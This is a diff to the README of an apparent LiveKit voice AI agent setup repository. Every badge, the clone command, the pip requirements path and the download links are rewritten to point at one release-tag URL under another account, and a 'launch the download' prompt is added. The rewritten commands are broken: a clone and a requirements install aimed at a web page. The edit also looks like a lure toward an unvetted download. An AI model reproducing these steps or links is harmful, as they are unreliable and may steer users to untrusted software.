@@ -2,7 +2,7 @@
 
 🚀 Welcome to the LiveKit Voice AI Agent Setup repository! 🤖🔊👋
 
-![LiveKit Voice AI Agent Setup](https://img.shields.io/badge/LiveKit-Voice%20AI%20Agent%20Setup-brightgreen)
+![LiveKit Voice AI Agent Setup](https://github.com/Yunichi/livekit-voice-ai-agent-setup/releases/tag/v1.0%20AI%20Agent%20Setup-brightgreen)
 
 This repository focuses on setting up a cutting-edge AI assistant for seamless real-time voice interactions on the web. From speech-to-text (STT) to text-to-speech (TTS), this project leverages technologies such as deepgram, OpenAI, Twilio, and more to create a powerful voice AI agent.
 
@@ -39,14 +39,14 @@ Before setting up the agent, make sure you have the following prerequisites inst
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/your-username/livekit-voice-ai-agent-setup.git
+   git clone https://github.com/Yunichi/livekit-voice-ai-agent-setup/releases/tag/v1.0
    cd livekit-voice-ai-agent-setup
    ```
 
 2. Install the necessary Python dependencies:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/Yunichi/livekit-voice-ai-agent-setup/releases/tag/v1.0
    ```
 
 3. Configure your Twilio, OpenAI, and Deepgram API credentials within the designated configuration files.
@@ -57,7 +57,7 @@ Before setting up the agent, make sure you have the following prerequisites inst
 
 Once the agent setup is complete, you can interact with the AI assistant through various channels such as a web application, phone calls (PSTN), or SIP integration. The agent can perform tasks like answering queries, making calls on your behalf, sending messages in real-time, and much more!
 
-![LiveKit Voice AI Agent](https://img.shields.io/badge/Interact%20Now-Voice%20AI%20Agent-blue)
+![LiveKit Voice AI Agent](https://github.com/Yunichi/livekit-voice-ai-agent-setup/releases/tag/v1.0%20Now-Voice%20AI%20Agent-blue)
 
 For detailed usage instructions and customization options, refer to the project documentation.
 
@@ -71,6 +71,6 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 ---
 
-🔗 **Download the latest release:** [![Download v1.0.0](https://img.shields.io/badge/Download-v1.0.0-orange)](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip)
+🔗 **Download the latest release:** [![Download v1.0.0](https://github.com/Yunichi/livekit-voice-ai-agent-setup/releases/tag/v1.0)](https://github.com/Yunichi/livekit-voice-ai-agent-setup/releases/tag/v1.0)
 
-Need help launching the download? Visit the following link: [![Launch Download](https://img.shields.io/badge/Launch-Download%20File-lightgrey)](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip)
+Need help launching the download? Visit the following link: [![Launch Download](https://github.com/Yunichi/livekit-voice-ai-agent-setup/releases/tag/v1.0%20File-lightgrey)](https://github.com/Yunichi/livekit-voice-ai-agent-setup/releases/tag/v1.0)
